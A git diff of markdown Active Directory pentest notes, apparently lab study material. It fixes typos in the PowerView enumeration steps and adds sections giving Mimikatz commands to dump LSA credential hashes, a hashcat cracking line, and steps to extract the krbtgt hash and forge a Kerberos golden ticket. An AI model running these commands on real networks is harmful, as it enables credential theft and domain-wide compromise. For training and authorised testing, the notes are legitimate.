@@ -1665,7 +1665,7 @@ Get-NetGroup -GroupName *admin*
 
 ![image](https://github.com/user-attachments/assets/2c352812-a69f-40d4-a196-66a482331f96)
 
-- Enumerating more, use [cheatsheet]( https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) and [here](https://www.hackingarticles.in/active-directory-enumeration-powerview/)
+- Enumerating more, use [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) and [here](https://www.hackingarticles.in/active-directory-enumeration-powerview/)
 
 - Enumerating shares in AD-:
 
@@ -1675,7 +1675,7 @@ Invoke-ShareFinder
 
 ![image](https://github.com/user-attachments/assets/8efc7b0a-13b5-4dfe-acfe-0c4fc641a6c1)
 
-- Enumerating the windows os on AD-:
+- Enumerating the machines os on AD-:
 
 ```
 Get-NetComputer -fulldata | select operatingsystem
@@ -1750,12 +1750,66 @@ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2suppor
 
 ![image](https://github.com/user-attachments/assets/6b9e1c0a-8b0a-4180-ae82-c850bfd79ee2)
 
-- SOlved-:
+- Solved-:
 
 ![image](https://github.com/user-attachments/assets/42516a6b-25f3-46d2-a5ea-93e7edf4bc00)
 
 -----------------------
 
+### Mimikatz
+
+----------------------
+
+- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network.
+- Run the mimikatz binary with-:
+
+```powershell
+.\mimikatz.exe
+```
+
+- `privilege::debug`-:This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly.It should be `200: ok`.
+
+![image](https://github.com/user-attachments/assets/54896a79-623a-4951-a043-9df9a4f75929)
+
+- Dump hashes with-:
+
+```powershell
+lsadump::lsa /patch
+```
+
+![image](https://github.com/user-attachments/assets/dff6ac18-1a61-4368-825f-df5457485be1)
+
+- Crack with hashcat-:
+
+```bash
+hashcat -m 1000 <hash> rockyou.txt
+```
+
+---------------------
+
+### Golden Ticket
+
+----------------------
+
+- This attack dump the hash and sid of the krbtgt user. then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.
+- Dumping the hash of the user `Kerberos Ticket Granting Ticket` account, this dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket.
+
+```mimikatz
+lsadump::lsa /inject /name:krbtgt
+```
+![image](https://github.com/user-attachments/assets/5e75de95-d792-4015-8d2e-8e70cf3fdd24)
+
+- Create a golden ticket with-:
+
+```mimikatz
+kerberos::golden /user: /domain: /sid: /krbtgt: /id:
+```
+
+- Use `misc::cmd` to spawn an elevated shell-:
+
+
+
+![image](https://github.com/user-attachments/assets/80c18837-d239-477f-a320-232e50afab7a)
 
 
 
